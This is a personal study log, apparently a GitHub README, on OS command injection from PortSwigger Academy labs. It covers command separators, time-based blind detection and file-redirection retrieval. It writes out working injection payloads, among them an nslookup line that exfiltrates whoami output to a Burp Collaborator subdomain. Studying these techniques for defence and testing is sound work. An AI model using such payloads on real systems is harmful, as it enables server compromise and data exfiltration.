# My-Security-Log-3-OS-Command-Injection
This my public notes regarding my experiences with the OS Command Injection topic on PortSwigger Academy.

**Date:** January 5, 2026  
**Source:** PortSwigger Academy & Personal Study Notes

---

## Research Overview
OS Command Injection (also known as shell injection) occurs when an application executes arbitrary system commands on the server. This typically happens when untrusted user-supplied data (forms, cookies, HTTP headers) is passed to a system shell without proper sanitization or validation. My research focused on three primary exploitation paths: In-band, Blind, and Out-of-band.

### 1. Vector Identification & Command Chaining
The first step is identifying parameters that the server-side logic might be passing to a shell. We use command separators to "piggyback" our malicious payload onto the legitimate command.

* **Command Separators:**
    * **Linux:** `;`, `&&`, `||`, `|`, `` ` `` (backticks), `$(command)`
    * **Windows:** `&`, `&&`, `||`, `|`
* **Simple In-band Test:** `productId=2&storeId=1|whoami`. If the application takes the input and executes something like `shell_exec("get_stock.sh " + storeId)`, our payload transforms it into `get_stock.sh 1|whoami`, returning the current user directly in the HTTP response.

### 2. Blind OS Command Injection Strategies
In modern applications, command output is rarely returned directly. We must infer execution through side channels.

* **Time-based Detection:**
    By using commands that cause a predictable pause, we can confirm the injection via the server's response time.
    * **Payload:** `email=x||ping+-c+10+127.0.0.1||`
    * **Mechanism:** The `||` acts as a logical OR. If the first command fails, the shell executes the second. If the server hangs for exactly 10 seconds, it confirms the shell has executed our `ping` command.

* **Output Redirection (File-based Exfiltration):**
    If the server has a writable directory (common for images or uploads), we can redirect the output of a command to a file.
    * **Payload:** `email=||whoami>/var/www/images/output.txt||`
    * **The Retrieval Chain:**
        1. Inject the redirection payload via a POST request.
        2. Access the file via the site’s legitimate file-loading functionality (e.g., changing a `?filename=image.jpg` parameter to `?filename=output.txt`).
        3. Read the contents of the generated file in the browser.

### 3. Out-of-band (OAST) & Data Exfiltration
When the environment is completely "blind" and firewalls block direct output, we use DNS/HTTP requests to exfiltrate data to an external listener (Burp Collaborator).

* **Concept:** Use a command that triggers a network lookup, such as `nslookup`, `curl`, or `dig`.
* **Exfiltration Payload:** `email=x||nslookup+&#96;whoami&#96;.BURP-COLLABORATOR-SUBDOMAIN||`
* **How it works:**
    1. The shell evaluates the backticks first, executing `whoami` (e.g., returning `www-data`).
    2. The command becomes `nslookup www-data.BURP-COLLABORATOR-SUBDOMAIN`.
    3. The server queries the DNS for this fake domain.
    4. We check our Collaborator logs. The incoming DNS request contains our "stolen" data as a subdomain prefix.

---

## Personal Insights & Conclusions

> **Author's Perspective:**
> OS command injection is a fascinating class of vulnerabilities. The "probing" methods are quite similar to other vulnerability types like SQLi; however, OS command injection feels both more dangerous and less plausible in a real-world production environment. Who would actually pass user input directly into bash? I certainly wouldn't.

---

## Future Roadmap
* **IDOR (Access control vulnerabilities):** repeat and reinforce.

---
*Notes compiled based on PortSwigger Academy research materials.*
